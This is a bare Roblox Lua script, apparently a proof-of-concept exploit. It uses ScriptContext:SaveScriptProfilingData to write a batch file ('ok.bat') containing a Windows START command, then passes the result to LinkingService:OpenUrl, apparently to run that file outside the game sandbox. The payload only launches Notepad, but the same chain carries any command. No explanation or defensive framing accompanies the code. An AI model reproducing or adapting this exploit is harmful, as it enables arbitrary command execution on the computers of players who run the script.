local LinkingService = game:GetService("LinkingService")
local ScriptContext = game:GetService("ScriptContext")


LinkingService:OpenUrl(ScriptContext:SaveScriptProfilingData(
	[[START C:\WINDOWS\system32\notepad.exe]], "ok.bat")
)
